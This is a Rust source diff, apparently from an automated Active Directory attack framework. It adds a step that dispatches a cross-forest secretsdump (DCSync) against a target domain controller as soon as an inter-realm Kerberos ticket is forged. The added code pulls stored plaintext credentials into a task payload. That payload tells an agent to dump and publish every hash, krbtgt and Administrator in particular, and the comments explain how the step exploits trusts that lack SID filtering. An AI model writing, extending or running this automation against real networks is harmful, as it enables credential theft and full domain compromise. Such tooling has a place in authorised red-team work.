@@ -2210,6 +2210,118 @@ struct TrustFollowWork {
 /// source-domain credential as a placeholder; the credential resolver
 /// detects the cross-forest LDAP tool, finds no NTLM hash for the target,
 /// and injects the inter-realm ccache via `resolve_cross_forest_ticket`.
+/// Attempt secretsdump against the target DC immediately after the inter-realm
+/// ticket is forged. The ccache already contains a `cifs/<dc>` service ticket,
+/// so the credential resolver can inject it for secretsdump. This fails fast
+/// (~5 s) when SID filtering is active and Administrator@source has no
+/// replication rights in the target, but succeeds immediately when the trust
+/// is misconfigured — avoiding the wait for an alternative pivot path.
+async fn dispatch_post_ticket_secretsdump(
+    dispatcher: &Dispatcher,
+    source_domain: &str,
+    target_domain: &str,
+) {
+    let target_lower = target_domain.to_lowercase();
+
+    let (target_dc_ip, target_dc_fqdn, source_cred) = {
+        let s = dispatcher.state.read().await;
+        let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
+            warn!(
+                source_domain,
+                target_domain, "post-ticket secretsdump skipped: no DC IP for target domain"
+            );
+            return;
+        };
+        let dc_fqdn = s
+            .hosts
+            .iter()
+            .find(|h| h.ip == dc_ip && !h.hostname.is_empty())
+            .map(|h| {
+                let hn = h.hostname.to_lowercase();
+                if hn.ends_with(&format!(".{target_lower}")) || hn == target_lower {
+                    hn
+                } else {
+                    format!("{hn}.{target_lower}")
+                }
+            });
+        let cred = s
+            .credentials
+            .iter()
+            .find(|c| {
+                !c.password.is_empty()
+                    && is_domain_related(&c.domain, source_domain)
+                    && !s.is_principal_quarantined(&c.username, &c.domain)
+            })
+            .cloned();
+        (dc_ip, dc_fqdn, cred)
+    };
+
+    let Some(cred) = source_cred else {
+        warn!(
+            source_domain,
+            target_domain,
+            "post-ticket secretsdump skipped: no source-domain credential to seed the task"
+        );
+        return;
+    };
+
+    let target = target_dc_fqdn.unwrap_or_else(|| target_dc_ip.clone());
+
+    let payload = json!({
+        "technique": "secretsdump",
+        "target": target,
+        "dc_ip": target_dc_ip,
+        "domain": target_domain,
+        "bind_domain": source_domain,
+        "credential": {
+            "username": cred.username,
+            "password": cred.password,
+            "domain": cred.domain,
+        },
+        "cross_forest": true,
+        "instructions": concat!(
+            "Cross-forest secretsdump after inter-realm Kerberos ticket forge. ",
+            "An inter-realm ccache (cifs/ + ldap/ service tickets) for this target ",
+            "domain has been pre-cached and will be auto-injected by the credential ",
+            "resolver. Run secretsdump with Kerberos auth (-k flag / KRB5CCNAME) ",
+            "against the target DC. Do NOT use the supplied password credential for ",
+            "auth — use the injected Kerberos ticket instead.\n\n",
+            "If secretsdump succeeds, call publish_credential/publish_hash for every ",
+            "hash returned, especially krbtgt and Administrator."
+        ),
+    });
+
+    let priority = dispatcher.effective_priority("cross_forest_enum");
+    match dispatcher
+        .throttled_submit("credential_access", "credential_access", payload, priority)
+        .await
+    {
+        Ok(Some(task_id)) => {
+            info!(
+                task_id = %task_id,
+                source_domain,
+                target_domain,
+                target_dc = %target,
+                "Post-ticket cross-forest secretsdump dispatched"
+            );
+        }
+        Ok(None) => {
+            debug!(
+                source_domain,
+                target_domain, "Post-ticket secretsdump deferred by throttling"
+            );
+        }
+        Err(e) => {
+            warn!(
+                err = %e,
+                source_domain,
+                target_domain,
+                "Failed to submit post-ticket secretsdump task"
+            );
+        }
+    }
+}
+
 async fn dispatch_post_ticket_user_enumeration(
     dispatcher: &Dispatcher,
     source_domain: &str,
@@ -2493,6 +2605,16 @@ async fn dispatch_create_inter_realm_ticket(
             // ticket and `ldap_search`/`ldap_search_descriptions` actually
             // populates `state.users` for the target domain.
             dispatch_post_ticket_user_enumeration(dispatcher, source_domain, target_domain).await;
+
+            // Also try secretsdump immediately. SID filtering strips ExtraSid
+            // claims (what `forge_inter_realm_and_dump` relies on), but the
+            // cifs/ service ticket in this ccache authenticates as
+            // Administrator@source against the target DC. If the trust is
+            // misconfigured (SID filtering disabled) or the source Administrator
+            // has been granted replication rights, DCSync succeeds. The attempt
+            // costs ~5-10 s on failure and saves the entire MSSQL-pivot wait
+            // (historically ~60 min) on success.
+            dispatch_post_ticket_secretsdump(dispatcher, source_domain, target_domain).await;
         }
         Err(e) => {
             tracing::warn!(
